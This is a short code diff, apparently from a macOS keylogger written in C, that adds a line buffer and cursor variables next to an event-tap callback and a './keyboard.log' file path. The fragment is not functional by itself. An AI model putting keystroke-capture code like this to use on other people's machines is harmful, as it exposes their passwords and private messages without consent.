@@ -10,6 +10,9 @@
 FILE *logfile = NULL;
 const char *logfileLocation = "./keyboard.log";
 
+char line[255];
+int cursor = 0;
+
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
 const char *convertKeyCode(int);
 
